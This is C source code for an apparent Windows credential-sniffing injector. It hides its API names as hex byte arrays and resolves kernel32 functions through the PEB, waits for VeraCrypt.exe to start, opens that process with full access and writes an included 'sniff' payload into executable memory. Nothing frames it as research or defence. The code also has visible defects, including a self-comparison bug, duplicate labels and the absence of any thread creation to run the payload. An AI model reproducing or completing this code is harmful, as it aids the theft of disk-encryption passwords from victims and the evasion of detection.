#define WIN32_LEAN_AND_MEAN
#include <Windows.h>
#include <winternl.h>
#include <TlHelp32.h>

typedef struct _unicode_string
{
    USHORT Length;
    USHORT MaxLength;
    PWSTR Buffer;
} MY_UNICODE_STRING, *PMY_UNICODE_STRING;

typedef struct _ldr_data_table_entry
{
#ifdef _M_X64
    BYTE Dummy[48];
    PVOID64 pvDllBase;
    PVOID64 EntryPoint;
    DWORD64 SizeOfImage;
#else
    BYTE Dummy[24];
    PVOID pvDllBase;
    PVOID EntryPoint;
    DWORD32 SizeOfImage;
#endif
    MY_UNICODE_STRING FullDllName;
    MY_UNICODE_STRING BaseDllName;
} MY_LDR_DATA_TABLE_ENTRY;

typedef struct _WOW64CONTEXT
{
    union
    {
        HANDLE hProcess;
        BYTE bPadding2[8];
    } h;

    union
    {
        LPVOID lpvStartAddress;
        BYTE bPadding1[8];
    } s;

    union
    {
        LPVOID lpParameter;
        BYTE bPadding2[8];
    } p;

    union
    {
        HANDLE hThread;
        BYTE hPadding2[8];
    } t;
} WOW64CONTEXT, *LPWOW64CONTEXT;

// // Function to go to jump to 64 bit mode from 32 bit mode through "Heaven's Gate",
// // before attempting to create a thread in the target process
// typedef BOOL(WINAPI *X64FUNCTION)(DWORD dwParameter);

// // Function to create a new thread in the target process and provide the threadID
// typedef DWORD(WINAPI *EXECUTEX64)(X64FUNCTION pFunction, DWORD dwParameter);

size_t MyStrLen(CHAR *str)
{
    size_t strlen = 0;
    while (*str++ != 0)
    {
        ++strlen;
    }

    return strlen;
}

BOOL MyStrCmpiAW(CHAR *sStr1, WCHAR *sStr2)
{
    BOOL bAreEqual = TRUE;

    for (size_t c = 0; c < MyStrLen(sStr1); ++c)
    {
        if (sStr1[c] != sStr2[c])
        {
            if (sStr1[c] < sStr2[c])
            {
                if ((sStr1[c] + 32) != sStr2[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
            else if (sStr2[c] < sStr2[c])
            {
                if ((sStr2[c] + 32) != sStr1[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
        }
    }

    return bAreEqual;
}

BOOL MyStrCmpiAA(CHAR *sStr1, CHAR *sStr2)
{
    BOOL bAreEqual = TRUE;

    for (size_t c = 0; c < MyStrLen(sStr1); ++c)
    {
        if (sStr1[c] != sStr2[c])
        {
            if (sStr1[c] < sStr2[c])
            {
                if ((sStr1[c] + 32) != sStr2[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
            else if (sStr2[c] < sStr1[c])
            {
                if ((sStr2[c] + 32) != sStr1[c])
                {
                    bAreEqual = FALSE;
                    break;
                }
            }
        }
    }

    return bAreEqual;
}

ULONG_PTR MyGetKernelModuleHandle(void)
{
#ifdef _M_X64
    PEB *pPeb = (PEB *)__readgsqword(0x60);
#else
    PEB *pPeb = (PEB *)__readfsdword(0x30);
#endif

    LIST_ENTRY *FirstListEntry = &pPeb->Ldr->InMemoryOrderModuleList;
    LIST_ENTRY *CurrentListEntry = FirstListEntry->Flink;

    char cKernelDLL[] = {0x6b, 0x65, 0x72, 0x6e, 0x65, 0x6c, 0x33, 0x32, 0x2e, 0x64, 0x6c, 0x6c, 0};

    while (CurrentListEntry != FirstListEntry)
    {
        MY_LDR_DATA_TABLE_ENTRY *TableEntry = (MY_LDR_DATA_TABLE_ENTRY *)((ULONG_PTR)CurrentListEntry - sizeof(LIST_ENTRY));

        if (MyStrCmpiAW(cKernelDLL, TableEntry->BaseDllName.Buffer))
        {
            return (ULONG_PTR)TableEntry->pvDllBase;
        }

        CurrentListEntry = CurrentListEntry->Flink;
    }

    return NULL;
}

LPVOID MyGetProcAddressByName(ULONG_PTR ulModuleAddr, CHAR *sProcName)
{
    IMAGE_DOS_HEADER *DosHeader = (IMAGE_DOS_HEADER *)ulModuleAddr;
    IMAGE_NT_HEADERS *NTHeaders = (IMAGE_NT_HEADERS *)(ulModuleAddr + DosHeader->e_lfanew);

    IMAGE_DATA_DIRECTORY ExportDataDirectory = NTHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT];
    IMAGE_EXPORT_DIRECTORY *ExportDirectory = (IMAGE_EXPORT_DIRECTORY *)(ulModuleAddr + ExportDataDirectory.VirtualAddress);

    DWORD *AddressOfFunctions = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfFunctions);
    DWORD *AddressOfNames = (DWORD *)(ulModuleAddr + ExportDirectory->AddressOfNames);
    WORD *AddressOfNameOridinals = (WORD *)(ulModuleAddr + ExportDirectory->AddressOfNameOrdinals);

    ULONG_PTR lpvProcAddr = NULL;
    for (DWORD n = 0; n < ExportDirectory->NumberOfNames; ++n)
    {
        if (MyStrCmpiAA(sProcName, (ulModuleAddr + AddressOfNames[n])))
        {
            lpvProcAddr = (ULONG_PTR)(ulModuleAddr + AddressOfFunctions[AddressOfNameOridinals[n]]);
            break;
        }
    }

    return (LPVOID)lpvProcAddr;
}

DWORD FindTargetProcessID(CHAR *sTargetName)
{
    DWORD dwRetVal = -1;
    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        return dwRetVal;
    }

    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
    FARPROC(WINAPI * pGetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = MyGetProcAddressByName(hKernel, cGetProcAddress);

    char cCreateToolSnapshot[] = {0x43, 0x72, 0x65, 0x61, 0x74, 0x65, 0x54, 0x6f, 0x6f, 0x6c, 0x68, 0x65, 0x6c, 0x70, 0x33, 0x32, 0x53, 0x6e, 0x61, 0x70, 0x73, 0x68, 0x6f, 0x74, 0};
    HANDLE(WINAPI * pCreateToolhelp32Snapshot)
    (DWORD dwFlags, DWORD th32ProcessID) = pGetProcAddress(hKernel, cCreateToolSnapshot);

    char cProcess32First[] = {0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x46, 0x69, 0x72, 0x73, 0x74, 0};
    BOOL(WINAPI * pProcess32First)
    (HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = pGetProcAddress(hKernel, cProcess32First);

    char cProcess32Next[] = {0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x33, 0x32, 0x4e, 0x65, 0x78, 0x74, 0};
    BOOL(WINAPI * pProcess32Next)
    (HANDLE hSnapshot, LPPROCESSENTRY32 lppe) = pGetProcAddress(hKernel, cProcess32Next);

    HANDLE hSnapShot = pCreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (hSnapShot == INVALID_HANDLE_VALUE)
    {
        goto shutdown;
    }

    PROCESSENTRY32 ProcessEntry;
    ProcessEntry.dwSize = sizeof(PROCESSENTRY32);

    if (!pProcess32First(hSnapShot, &ProcessEntry))
    {
        goto shutdown;
    }

    char cOutputDebugStringA[] = {0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x65, 0x62, 0x75, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x41, 0};
    void(WINAPI * pOutputDebugStringA)(LPCSTR lpOutputString) = pGetProcAddress(hKernel, cOutputDebugStringA);

    while (pProcess32Next(hSnapShot, &ProcessEntry))
    {
        if (MyStrCmpiAA(sTargetName, ProcessEntry.szExeFile))
        {
            return ProcessEntry.th32ProcessID;
        }
    }

shutdown:
    char cCloseHandle[] = {0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
    BOOL(WINAPI * pCloseHandle)
    (HANDLE hObject) = pGetProcAddress(hKernel, cCloseHandle);

    pCloseHandle(hSnapShot);

    return dwRetVal;
}

int main(void)
{
    char cProlog[] = {0xFFFFFFFFFFFF};
    HMODULE hKernel = MyGetKernelModuleHandle();

    if (hKernel == NULL)
    {
        return 0;
    }

    char cGetProcAddress[] = {0x47, 0x65, 0x74, 0x50, 0x72, 0x6f, 0x63, 0x41, 0x64, 0x64, 0x72, 0x65, 0x73, 0x73, 0};
    FARPROC(WINAPI * pGetProcAddress)
    (HMODULE hModule, LPCSTR lpProcName) = MyGetProcAddressByName(hKernel, cGetProcAddress);

    char cVeraCrypt[] = {0x56, 0x65, 0x72, 0x61, 0x43, 0x72, 0x79, 0x70, 0x74, 0x2e, 0x65, 0x78, 0x65, 0};

    char cSleep[] = {0x53, 0x6c, 0x65, 0x65, 0x70, 0};
    void(WINAPI * pSleep)(DWORD dwMilliseconds) = pGetProcAddress(hKernel, cSleep);

    DWORD dwProcID = -1;
    while (1)
    {
        dwProcID = FindTargetProcessID(cVeraCrypt);

        if (dwProcID != -1)
        {
            break;
        }

        pSleep(5000);
    }

    char cOpenProcess[] = {0x4f, 0x70, 0x65, 0x6e, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0};
    HANDLE(WINAPI * pOpenProcess)
    (DWORD dwDesiredAccess, BOOL bInheritHandle, DWORD dwProcessId) = pGetProcAddress(hKernel, cOpenProcess);

    HANDLE hTargetProc = pOpenProcess(PROCESS_ALL_ACCESS, FALSE, dwProcID);
    if (hTargetProc == NULL)
    {
        return 0;
    }

#include "sniff.x64.bin.h"

    char cVirtualAllocEx[] = {0x56, 0x69, 0x72, 0x74, 0x75, 0x61, 0x6c, 0x41, 0x6c, 0x6c, 0x6f, 0x63, 0x45, 0x78, 0};
    LPVOID(WINAPI * pVirtualAllocEx)
    (HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD flAllocationType, DWORD flProtect) = pGetProcAddress(hKernel, cVirtualAllocEx);

    LPVOID lpvPayloadMem = pVirtualAllocEx(hTargetProc, NULL, sniff_data_len, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READ);
    if (lpvPayloadMem == NULL)
    {
        goto shutdown;
    }

    char cWriteProcessMemory[] = {0x57, 0x72, 0x69, 0x74, 0x65, 0x50, 0x72, 0x6f, 0x63, 0x65, 0x73, 0x73, 0x4d, 0x65, 0x6d, 0x6f, 0x72, 0x79, 0};

    BOOL(WINAPI * pWriteProcessMemory)
    (HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T * lpNumberOfBytesWritten) = pGetProcAddress(hKernel, cWriteProcessMemory);

    if (!pWriteProcessMemory(hTargetProc, lpvPayloadMem, sniff_data, sniff_data_len, NULL))
    {
        goto shutdown;
    }

    ((void)sniff_data);

    char cOutputDebugStringA[] = {0x4f, 0x75, 0x74, 0x70, 0x75, 0x74, 0x44, 0x65, 0x62, 0x75, 0x67, 0x53, 0x74, 0x72, 0x69, 0x6e, 0x67, 0x41, 0};
    void(WINAPI * pOutputDebugStringA)(LPCSTR lpOutputString) = pGetProcAddress(hKernel, cOutputDebugStringA);

    char cPrintString[] = {0x59, 0x6f, 0x6f, 0x68, 0x6f, 0x6f, 0x6f, 0x21, 0x21, 0x21, 0};
    pOutputDebugStringA(cPrintString);

shutdown:
    char cCloseHandle[] = {0x43, 0x6c, 0x6f, 0x73, 0x65, 0x48, 0x61, 0x6e, 0x64, 0x6c, 0x65, 0};
    BOOL(WINAPI * pCloseHandle)
    (HANDLE hObject) = pGetProcAddress(hKernel, cCloseHandle);

    if (pCloseHandle == NULL)
    {
        return 0;
    }

    pCloseHandle(hTargetProc);
    char cEpilog[] = {0xAAAAAAAAAAAAAA};
    return 0;
}
